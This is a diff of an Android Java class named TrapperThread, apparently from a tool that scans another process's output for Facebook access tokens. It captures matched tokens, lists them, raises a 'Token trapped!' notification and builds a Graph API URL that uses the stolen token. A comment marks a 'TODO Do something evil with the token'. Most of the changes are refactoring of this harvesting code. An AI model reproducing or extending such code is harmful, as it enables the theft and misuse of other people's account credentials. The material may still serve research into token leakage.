@@ -26,12 +26,12 @@ public class TrapperThread extends Thread {
 	}
 
 	public void doInBackground(ListView list,
-			final ArrayAdapter<String> adapter) {
+			final ArrayAdapter<TrapperResult> mListAdapter) {
 		// Clear the list
 		list.post(new Runnable() {
 			@Override
 			public void run() {
-				adapter.clear();
+				mListAdapter.clear();
 			}
 		});
 		Process process = null;
@@ -51,21 +51,21 @@ public class TrapperThread extends Thread {
 				if (line == null) {
 					break;
 				}
-				// Update the list
-				list.post(new Runnable() {
-					@Override
-					public void run() {
-						while (adapter.getCount() > TrapperActivity.MAX_ITEMS - 10) {
-							adapter.remove(adapter.getItem(0));
-						}
-						adapter.add(line);
-					}
-				});
 				Matcher match = pattern.matcher(line);
 				if (match.find()) {
-					String token = match.group(1);
+					final String token = match.group(1);
 					showNotification(++count, "Token trapped!", token);
 					// TODO Do something evil with the token
+					// Update the list
+					list.post(new Runnable() {
+						@Override
+						public void run() {
+							while (mListAdapter.getCount() > TrapperActivity.MAX_ITEMS - 10) {
+								mListAdapter.remove(mListAdapter.getItem(0));
+							}
+							mListAdapter.add(new TrapperResult(line, token));
+						}
+					});
 				}
 				// Short delay to prevent locking up
 				Thread.sleep(10);
@@ -96,7 +96,7 @@ public class TrapperThread extends Thread {
 		});
 	}
 
-	protected void showNotification(int id, String title, String token) {
+	protected int showNotification(int id, String title, String token) {
 		NotificationManager ns = (NotificationManager) mActivity
 				.getSystemService(Context.NOTIFICATION_SERVICE);
 		Notification notification = new Notification(
@@ -113,8 +113,8 @@ public class TrapperThread extends Thread {
 			notification.flags |= Notification.FLAG_ONGOING_EVENT;
 		} else {
 			intent = new Intent(Intent.ACTION_VIEW,
-						Uri.parse("https://graph.facebook.com/me?access_token="
-								+ token));
+					Uri.parse("https://graph.facebook.com/me?access_token="
+							+ token));
 		}
 		PendingIntent contentIntent = PendingIntent
 				.getActivity(mActivity, 0,
@@ -125,6 +125,7 @@ public class TrapperThread extends Thread {
 		if (cancel) {
 			ns.cancel(id);
 		}
+		return id;
 	}
 
 }
